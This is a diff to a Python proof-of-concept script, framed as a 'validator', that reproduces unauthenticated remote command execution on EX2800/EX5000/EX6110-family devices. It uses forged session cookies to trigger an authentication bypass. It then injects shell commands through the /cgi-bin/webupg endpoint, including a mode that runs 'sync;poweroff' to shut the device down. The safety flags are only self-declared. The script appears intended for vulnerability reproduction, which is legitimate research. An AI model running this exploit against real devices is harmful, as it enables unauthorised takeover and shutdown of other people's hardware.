@@ -1,10 +1,15 @@
 #!/usr/bin/env python3
-"""EX2800/EX5000/EX6110 unconfigured-state webupg validator.
+"""EX2800-family webupg command-execution validator.
 
 The default remains loopback-only.  Physical-device mode is deliberately
 restricted to an explicitly acknowledged, private, isolated lab target.
 The default mode proves command execution with harmless reflected output.
 The destructive shutdown mode requires a second, explicit acknowledgement.
+
+With no session supplied, the validator exercises the factory-unconfigured
+authentication bypass.  ``--session-cookie`` instead exercises the same
+webupg command sink through a legitimate configured-device session, removing
+the setup-state dependency without claiming an authentication bypass.
 """
 
 import argparse
@@ -77,6 +82,13 @@ def main() -> int:
     parser.add_argument("--expected-model")
     parser.add_argument("--expected-version")
     parser.add_argument(
+        "--session-cookie",
+        help=(
+            "legitimate Cookie header value from an authenticated management "
+            "session; skips the factory-unconfigured bypass"
+        ),
+    )
+    parser.add_argument(
         "--mode",
         choices=("verify", "shutdown"),
         default="verify",
@@ -94,6 +106,12 @@ def main() -> int:
     )
     args = parser.parse_args()
 
+    if args.session_cookie is not None:
+        if not args.session_cookie.strip():
+            parser.error("--session-cookie must not be empty")
+        if "\r" in args.session_cookie or "\n" in args.session_cookie:
+            parser.error("--session-cookie must not contain CR or LF")
+
     if args.mode == "shutdown":
         if not args.hardware_lab:
             parser.error("--mode shutdown is restricted to --hardware-lab")
@@ -103,13 +121,14 @@ def main() -> int:
     if args.hardware_lab:
         if not args.i_own_this_isolated_device:
             parser.error("--hardware-lab requires --i-own-this-isolated-device")
-        supported_hardware = {"EX5000", "EX6110"}
+        supported_hardware = {"EX2800", "EX3110", "EX5000", "EX6110"}
         if (
             args.expected_model not in supported_hardware
             or args.expected_version != "V1.0.1.84"
         ):
             parser.error(
-                "hardware mode is gated to --expected-model EX5000 or EX6110 "
+                "hardware mode is gated to --expected-model EX2800, EX3110, "
+                "EX5000, or EX6110 "
                 "--expected-version V1.0.1.84"
             )
     try:
@@ -129,11 +148,15 @@ def main() -> int:
             except FileNotFoundError:
                 pass
 
+    configured_session = args.session_cookie is not None
     if args.hardware_lab:
         print("validation_mode=owned_isolated_physical_device")
         print(f"expected_model={args.expected_model}")
         print(f"expected_version={args.expected_version}")
-        print("unconfigured_state_present=externally_factory_reset")
+        if configured_session:
+            print("configured_authenticated_session_supplied=true")
+        else:
+            print("unconfigured_state_present=externally_factory_reset")
     else:
         print(f"unconfigured_state_present={str(os.path.exists(unconfigured)).lower()}")
     trigger_paths = [
@@ -151,22 +174,23 @@ def main() -> int:
             "&var:page=BRS_haveBackupFile"
         ),
     ]
-    trigger = None
-    for path in trigger_paths:
-        status = request(
-            args.target,
-            args.port,
-            path,
-            headers={"Cookie": "sessionid=unconfigured-setup"},
-        )
-        created = os.path.exists(bypass) if not args.hardware_lab else False
-        print(
-            f"setup_trigger_status={status} "
-            f"upgUnauth_created={str(created).lower()} path={path!r}"
-        )
-        if created or (args.hardware_lab and status != 0):
-            trigger = path
-            break
+    trigger = "authenticated configured-device session" if configured_session else None
+    if not configured_session:
+        for path in trigger_paths:
+            status = request(
+                args.target,
+                args.port,
+                path,
+                headers={"Cookie": "sessionid=unconfigured-setup"},
+            )
+            created = os.path.exists(bypass) if not args.hardware_lab else False
+            print(
+                f"setup_trigger_status={status} "
+                f"upgUnauth_created={str(created).lower()} path={path!r}"
+            )
+            if created or (args.hardware_lab and status != 0):
+                trigger = path
+                break
 
     post_bodies = [
         {
@@ -223,14 +247,14 @@ def main() -> int:
         print("upgUnauth_preseeded_for_component_check=true")
 
     if args.mode == "verify":
-        response_token = b"FRIDAY_EX6110_RCE_VERIFIED"
-        command = "echo${IFS}FRIDAY_EX6110_RCE_VERIFIED"
+        response_token = b"FRIDAY_EX2800_RCE_VERIFIED"
+        command = "echo${IFS}FRIDAY_EX2800_RCE_VERIFIED"
     else:
         # Emit an acknowledgement before invoking BusyBox poweroff.  A dropped
         # connection or an unreachable device is expected after this request.
-        response_token = b"FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
+        response_token = b"FRIDAY_EX2800_SHUTDOWN_ACCEPTED"
         command = (
-            "echo${IFS}FRIDAY_EX6110_SHUTDOWN_ACCEPTED"
+            "echo${IFS}FRIDAY_EX2800_SHUTDOWN_ACCEPTED"
             ";sync;poweroff"
         )
 
@@ -252,7 +276,13 @@ def main() -> int:
         args.target,
         args.port,
         f"/cgi-bin/webupg?{query}",
-        headers={"Cookie": "sessionid=component-check"},
+        headers={
+            "Cookie": (
+                args.session_cookie
+                if configured_session
+                else "sessionid=component-check"
+            )
+        },
     )
     reflected = response_token in last_response_body
     if args.mode == "shutdown":
@@ -262,9 +292,17 @@ def main() -> int:
         executed = reflected
     else:
         executed = reflected if args.hardware_lab else os.path.exists(marker) or reflected
-    consumed = reflected if args.hardware_lab else not os.path.exists(bypass)
+    consumed = (
+        reflected
+        if args.hardware_lab or configured_session
+        else not os.path.exists(bypass)
+    )
     print(f"webshell_status={status}")
-    print(f"upgUnauth_consumed={str(consumed).lower()}")
+    print(
+        "upgUnauth_consumed="
+        f"{'not_applicable' if configured_session else str(consumed).lower()}"
+    )
+    print(f"upgUnauth_bypass_used={str(not configured_session).lower()}")
     print(f"mode={args.mode}")
     if args.mode == "verify":
         print(f"harmless_command_executed={str(executed).lower()}")
@@ -274,7 +312,18 @@ def main() -> int:
     print(f"command_output_reflected={str(reflected).lower()}")
     reproduced = executed and consumed and not component_only
     print(f"webshell_component_execution={str(executed and consumed).lower()}")
-    print(f"unauthenticated_rce_reproduced={str(reproduced).lower()}")
+    print(
+        "configured_state_rce_reproduced="
+        f"{str(reproduced and configured_session).lower()}"
+    )
+    print(
+        "authenticated_rce_reproduced="
+        f"{str(reproduced and configured_session).lower()}"
+    )
+    print(
+        "unauthenticated_rce_reproduced="
+        f"{str(reproduced and not configured_session).lower()}"
+    )
     return 0 if executed and consumed else 1
 
 
